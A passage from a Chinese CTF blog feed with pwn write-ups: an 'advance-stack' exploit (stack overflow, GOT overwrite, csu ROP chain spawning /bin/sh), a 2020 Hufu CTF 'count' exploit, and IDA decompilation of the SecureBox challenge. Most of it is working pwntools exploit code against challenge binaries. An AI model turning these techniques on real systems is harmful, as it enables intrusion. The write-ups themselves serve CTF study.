punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"realloc"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>sla<span class="token punctuation">(</span><span class="token string">"Choice >>"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="advance-stack"><a href="#advance-stack" class="headerlink" title="advance-stack"></a>advance-stack</h1><p>要保证拟态环境下输出一致，无法leak</p><h2 id="查看文件-4"><a href="#查看文件-4" class="headerlink" title="查看文件"></a>查看文件</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="en-resource://database/9826:1" alt="f4f3c334f3e47cbd4a74dfeac3839ca7.png"><br>可以改got表，且PIE没开。</p><h2 id="IDA分析-4"><a href="#IDA分析-4" class="headerlink" title="IDA分析"></a>IDA分析</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="en-resource://database/9820:1" alt="46e07c74f0a49bc97df0a9e7279019c5.png"><br>栈溢出。</p><h2 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h2><p>本来如果没有拟态环境的限制，可以先输出函数地址，算出libc，再直接ret one_gadget,但拟态环境下要求输出相同，所以我们无法利用该思路。</p><p>思路一：后三位字节爆破1/4096（本地通了，远程没有）</p><p>思路二：可以通过劫持got，改后两位为某个字节，令call got的时候是执行syscall。之前见过这种题，当时做题忽视了很多东西，一个是got表可写。最后利用csu来call一下我们修改的got表即可，注意提前布置好参数，用read来读取0x3b个字节，令rax为system的系统调用号</p><h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> string<span class="token keyword">import</span> syscontext<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./easy-stack'</span><span class="token punctuation">)</span>libc_offset <span class="token operator">=</span> <span class="token number">0x3c4b20</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./easy-stack'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'172.35.100.100'</span><span class="token punctuation">,</span><span class="token number">10001</span><span class="token punctuation">)</span>csu_end_addr <span class="token operator">=</span> <span class="token number">0x40061a</span>csu_front_addr <span class="token operator">=</span> <span class="token number">0x400600</span>main_addr <span class="token operator">=</span> <span class="token number">0x400566</span>ret_addr <span class="token operator">=</span> <span class="token number">0x0000000000400419</span>leave <span class="token operator">=</span> <span class="token number">0x0000000000400585</span><span class="token comment" spellcheck="true">#add    DWORD PTR [rbp-0x3d],ebx;nop    DWORD PTR [rax+rax*1+0x0];repz ret</span>add <span class="token operator">=</span> <span class="token number">0x4005e8</span>libc_start_main <span class="token operator">=</span> <span class="token number">0x400544</span>p_rdi <span class="token operator">=</span> <span class="token number">0x0000000000400623</span>p_rbp <span class="token operator">=</span> <span class="token number">0x00000000004004d0</span>p_rsp_r3 <span class="token operator">=</span> <span class="token number">0x000000000040076d</span>p_rbp_r4 <span class="token operator">=</span> <span class="token number">0x000000000040076b</span>readn <span class="token operator">=</span> <span class="token number">0x4006bf</span>p_rbx_rbp_p_4 <span class="token operator">=</span> csu_end_addrp_rsi_r15 <span class="token operator">=</span> <span class="token number">0x0000000000400621</span><span class="token keyword">def</span> <span class="token function">csu</span><span class="token punctuation">(</span>rbx<span class="token punctuation">,</span> rbp<span class="token punctuation">,</span> r12<span class="token punctuation">,</span> r13<span class="token punctuation">,</span> r14<span class="token punctuation">,</span> r15<span class="token punctuation">,</span> fake_rbp<span class="token punctuation">,</span> last<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">''</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>csu_end_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rbx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rbp<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r12<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r13<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r14<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r15<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>csu_front_addr<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x10</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_rbp<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>last<span class="token punctuation">)</span>                              <span class="token keyword">return</span> payload<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#leak libc</span>    read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>    read_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>    write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>    write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>    bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x300</span>    payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x80</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>        p_rdi<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>        p_rsi_r15<span class="token punctuation">,</span>write_got<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>        read_plt<span class="token punctuation">,</span>        ret_addr<span class="token punctuation">,</span>        p_rdi<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>        p_rsi_r15<span class="token punctuation">,</span>bss<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>        read_plt<span class="token punctuation">,</span>        leave        <span class="token punctuation">]</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\xbe'</span><span class="token punctuation">)</span>    raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">"/bin/sh\x00"</span>    payload <span class="token operator">+=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>        p_rdi<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>p_rsi_r15<span class="token punctuation">,</span>bss<span class="token operator">+</span><span class="token number">0x300</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>read_plt<span class="token punctuation">,</span>ret_addr        <span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#open flag</span>    payload <span class="token operator">+=</span> csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>write_got<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>bss<span class="token punctuation">,</span>bss<span class="token operator">+</span><span class="token number">0x200</span><span class="token punctuation">,</span>ret_addr<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#get more to 0x200</span>    payload <span class="token operator">+=</span> csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>read_got<span class="token punctuation">,</span><span class="token number">0x400</span><span class="token punctuation">,</span>bss<span class="token operator">+</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>bss<span class="token operator">+</span><span class="token number">0x200</span><span class="token punctuation">,</span>leave<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"\x11"</span><span class="token operator">*</span><span class="token number">0x3b</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 2020 Game </category>
          
      </categories>
      
      
        <tags>
            
            <tag> off by null </tag>
            
            <tag> 格式化字符串+栈溢出 </tag>
            
            <tag> 负数溢出 </tag>
            
            <tag> fopen/fread </tag>
            
            <tag> 整数溢出 </tag>
            
            <tag> master of UAF </tag>
            
            <tag> advance stack overflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-虎符线上赛部分PWN解题</title>
      <link href="/2020/12/09/2020-hu-fu-xian-shang-sai-bu-fen-pwn-jie-ti/"/>
      <url>/2020/12/09/2020-hu-fu-xian-shang-sai-bu-fen-pwn-jie-ti/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>很早的比赛，线下被俺们鸽掉了，这里做个总结</p><p>count：栈溢出<br>SecureBox：汇编层面的一个整数溢出，很有意思<br>MarksMan：改三个字节，通过exit来getshell</p><h1 id="count"><a href="#count" class="headerlink" title="count"></a>count</h1><p>程序没开PIE，主函数如下：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/09/2020-hu-fu-xian-shang-sai-bu-fen-pwn-jie-ti/0.png"></div>这个题计算199次后，栈溢出即可getshell，很简单。<p>exp：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">"./pwn"</span>context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'aarch64'</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"/lib64/libc.so.6"</span><span class="token punctuation">,</span> checksec <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>remote_gdb<span class="token operator">=</span><span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">get_sh</span><span class="token punctuation">(</span>other_libc <span class="token operator">=</span> null<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> libc    <span class="token keyword">if</span> args<span class="token punctuation">[</span><span class="token string">'REMOTE'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> other_libc <span class="token keyword">is</span> <span class="token operator">not</span> null<span class="token punctuation">:</span>            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./"</span><span class="token punctuation">,</span> checksec <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> remote_gdb<span class="token punctuation">:</span>        sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-aarch64"</span><span class="token punctuation">,</span> <span class="token string">"-g"</span><span class="token punctuation">,</span> <span class="token string">"1234"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/lib64"</span><span class="token punctuation">,</span> <span class="token string">"./pwn"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'Please use GDB remote!(Enter to continue)'</span><span class="token punctuation">)</span>        raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> sh    <span class="token keyword">else</span> <span class="token punctuation">:</span>        <span class="token keyword">return</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-aarch64"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/lib64"</span><span class="token punctuation">,</span> <span class="token string">"./pwn"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_answer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Math: '</span><span class="token punctuation">)</span>    equal<span class="token operator">=</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">' ='</span><span class="token punctuation">)</span>    equal<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" ="</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>    equal <span class="token operator">=</span> equal<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">print</span> equal    <span class="token keyword">return</span> eval<span class="token punctuation">(</span>equal<span class="token punctuation">)</span>p <span class="token operator">=</span> get_sh<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> get_answer<span class="token punctuation">(</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"good !"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x64</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x12235612</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x12235612</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="SecureBox"><a href="#SecureBox" class="headerlink" title="SecureBox"></a>SecureBox</h1><h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>1）create</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  heap_manage <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rbx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+4h] [rbp-2Ch]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-28h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-24h]</span>  <span class="token keyword">unsigned</span> __int64 size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-20h]</span>  <span class="token keyword">unsigned</span> __int64 v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-18h]</span>  v6 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">15</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>qword_202060<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      v2 <span class="token operator">=</span> i<span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No boxes available!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    size <span class="token operator">=</span> <span class="token function">get_number</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> size <span class="token operator">></span> <span class="token number">0x100</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>size <span class="token operator">&lt;=</span> <span class="token number">0xFFF</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      qword_202060<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x28uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// 管理chunk结构体</span>      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>qword_202060<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">=</span> size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这里是下一个chunk的pre_size</span>      v0 <span class="token operator">=</span> <span class="token punctuation">(</span>heap_manage <span class="token operator">*</span><span class="token punctuation">)</span>qword_202060<span class="token punctuation">[</span>v2<span class="token punctuation">]</span><span class="token punctuation">;</span>      v0<span class="token operator">-></span>chunk_addr <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">memset</span><span class="token punctuation">(</span>qword_202060<span class="token punctuation">[</span>v2<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x14uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 将manage chunk前0x14设置为null</span>      <span class="token function">get_info_from_random_file</span><span class="token punctuation">(</span>qword_202060<span class="token punctuation">[</span>v2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 从random file中read 0x10 到chunk</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Key: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">15</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>               <span class="token comment" spellcheck="true">// 打印出随机数</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02x "</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span>qword_202060<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nBox ID: %d\n"</span><span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Finish!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v6<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2)delete</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">unsigned</span> __int64 v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-10h]</span>  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-8h]</span>  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Box ID: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">get_number</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">0xF</span> <span class="token punctuation">)</span>                               <span class="token comment" spellcheck="true">// 判断index边界</span>  <span class="token punctuation">{</span>LABEL_7<span class="token punctuation">:</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Finish!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v2<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> qword_202060<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>qword_202060<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 判断manage chunk中chunk address的位置是否为空</span>    <span class="token punctuation">{</span>      <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>qword_202060<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>qword_202060<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">free</span><span class="token punctuation">(</span>qword_202060<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token comment" spellcheck="true">// 删除管理chunk</span>    qword_202060<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> LABEL_7<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Empty Box!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v2<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" 